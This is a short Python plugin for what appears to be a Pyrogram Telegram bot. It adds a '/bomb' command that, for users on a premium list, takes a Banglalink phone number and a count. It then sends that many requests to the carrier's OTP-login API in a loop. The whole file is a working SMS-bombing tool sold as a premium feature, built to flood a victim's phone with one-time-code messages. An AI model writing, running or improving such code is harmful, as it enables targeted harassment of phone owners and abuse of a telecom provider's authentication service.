import requests
from pyrogram import Client,filters
def register(app):
	@app.on_message(filters.command('bomb'))
	async def A(client,message):
		A=message
		with open(file='users/premium.txt',mode='r+',encoding='utf-8')as E:F=E.readlines()
		if str(A.from_user.id)+'\n'in F:
			try:G,B,C=A.text.split();B=B.strip();C=int(C.strip())
			except ValueError:return await A.reply('<b>⎚ Use <code>/bomb </code>[number] [amount]</b>')
			except Exception as D:return await A.reply(f"<b>⎚ Error: {str(D)}</b>")
			if len(B)==11 and str(B).startswith(('019','014')):
				H=await A.reply('<b>⎚ `Request Sending...`</b>')
				for G in range(C):
					I={'mobile':B}
					try:J=requests.post(url='https://web-api.banglalink.net/api/v1/user/otp-login/request',json=I).json()
					except Exception as D:print(f"Error sending request: {str(D)}")
				await H.edit('<b>Finished</b>')
			else:await A.reply('<b>Please Use Banglalink Number Without +880</b>')
		else:return await A.reply(f"<b>Only For Premium Members</b>")
